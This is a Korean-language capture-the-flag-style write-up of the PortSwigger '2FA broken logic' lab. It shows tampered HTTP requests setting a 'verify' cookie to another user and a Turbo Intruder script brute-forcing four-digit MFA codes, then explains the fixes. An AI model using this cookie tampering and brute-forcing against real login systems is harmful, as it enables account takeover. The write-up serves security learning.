+++
date = '2026-08-05T18:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - 2FA broken logic'
summary = "2단계 코드가 세션이 아닌 verify 쿠키에 묶인 점을 이용해 대상 계정으로 코드를 발급시키고, 시도 제한 없는 4자리 코드를 브루트포스해 계정을 탈취하는 Authentication 풀이"
toc = true
tags = ["Authentication", "Multi-Factor Authentication", "Broken Logic", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)

> ![image.png](/writeup/portswigger/authentication/08/1.png)

이 랩은 2단계 인증의 로직 결함에 취약하다. 이를 이용해 `carlos`의 계정 페이지에 접근하면 문제가 해결된다. 실습 계정은 `wiener:peter`, 대상 계정은 `carlos`다.

### Authentication 진단

본인 계정으로 2단계 인증을 진행하며 흐름을 분석한다. 로그인하면 이메일로 4자리 코드가 오고, 이를 입력하면 최종 인증이 완료된다.

![image.png](/writeup/portswigger/authentication/08/2.png)

1단계 로그인 요청은 다음과 같다.

```http
POST /login HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<session>
Content-Type: application/x-www-form-urlencoded

username=wiener&password=peter
```

응답을 보면, 서버가 **인증 대상 username을 `verify` 쿠키로 내려준다.**

```http
HTTP/2 302 Found
Location: /login2
Set-Cookie: verify=wiener; HttpOnly
Set-Cookie: session=gjtThl2qzU3zFXOyURijEnplua0XZWW5; Secure; HttpOnly; SameSite=None
Content-Length: 0
```

2단계 요청은 이 `verify` 쿠키에 담긴 username을 근거로 코드를 검증한다.

```http
POST /login2 HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: verify=wiener; session=gjtThl2qzU3zFXOyURijEnplua0XZWW5
Content-Type: application/x-www-form-urlencoded

mfa-code=1644
```

`verify` 쿠키가 세션과 단단히 묶여 있는지 확인하기 위해 값을 `carlos`로 바꿔 보면 인증이 실패한다. 그럼 이번엔 세션 쿠키를 아예 제거하고 `verify`만 남겨 요청한다.

```http
POST /login2 HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: verify=wiener;
Content-Type: application/x-www-form-urlencoded

mfa-code=0518
```

세션 없이 `verify` 쿠키와 코드만으로 로그인이 성립한다. **2단계 인증이 세션이 아니라 클라이언트가 통제하는 `verify` 쿠키에 묶여 있다**는 뜻이다. 결국 계정 이름과 4자리 코드만 알면 그 계정에 접근할 수 있다.

---

## 익스플로잇

2FA 코드는 4자리 숫자(0000–9999)이고 시도 제한도 없어 전수 대입이 가능하다. 먼저 `carlos`에게 코드가 발급되도록 `verify=carlos`로 2단계 페이지를 호출해 코드 생성을 유도한다.

```http
GET /login2 HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: verify=carlos;
```

이제 `verify=carlos` 상태에서 `mfa-code`를 0000부터 9999까지 대입한다. Turbo Intruder 스크립트는 다음과 같다.

```python
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=50,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=3
                           )

    for n in range(10000):
        numbers = str(n).zfill(4)
        engine.queue(target.req, numbers)

def handleResponse(req, interesting):
    table.add(req)
```

`str(n).zfill(4)`로 `0000`~`9999`를 만들어 순차 대입한다. 결과에서 `1620` 코드가 302 응답을 돌려준다.

![image.png](/writeup/portswigger/authentication/08/3.png)

해당 코드로 2단계를 통과하면 `carlos`의 계정 페이지에 접근되며 문제가 해결된다.

![image.png](/writeup/portswigger/authentication/08/4.png)

---

## 정리

이 랩은 두 개의 결함이 겹쳐 MFA를 무력화한다. 첫째, **2단계 인증이 세션에 묶이지 않았다.** 인증 대상을 `verify=carlos`라는 클라이언트 통제 쿠키로 지정하므로, 공격자는 자기가 로그인하지 않은 계정에 대해서도 코드 검증을 요청할 수 있다. 세션이 없어도 되니 1단계(비밀번호)를 통과할 필요조차 없다. 둘째, **4자리 코드에 시도 제한이 없다.** 10,000개 후보는 자동화로 수 분이면 소진된다.

MFA가 방어선으로 기능하려면, 두 번째 요소는 **첫 번째 요소를 통과한 바로 그 세션에만** 발급·검증되어야 한다. 인증 대상을 쿠키·파라미터가 아니라 서버가 세션에 저장한 값으로 판정하면, 공격자가 남의 계정으로 코드를 검증시키는 이 경로 자체가 막힌다. 여기에 코드 시도 제한(예: 몇 회 실패 시 재로그인 강제)을 더하면 브루트포스도 봉쇄된다.

이는 [2FA simple bypass](/write-up/portswigger/authentication/write-up-portswigger---2fa-simple-bypass/)가 "2단계를 아예 건너뛴" 것과 달리, 2단계를 거치되 그 검증이 잘못된 근거에 묶인 경우다. 신원을 클라이언트 값에 싣는다는 점에서 [password reset broken logic](/write-up/portswigger/authentication/write-up-portswigger---password-reset-broken-logic/)과도 같은 뿌리다. 시도 제한이 없다는 결함만 단독으로 파고드는 랩은 [2FA brute-force](/write-up/portswigger/authentication/write-up-portswigger---2fa-bypass-using-a-brute-force-attack/)에서 다룬다.
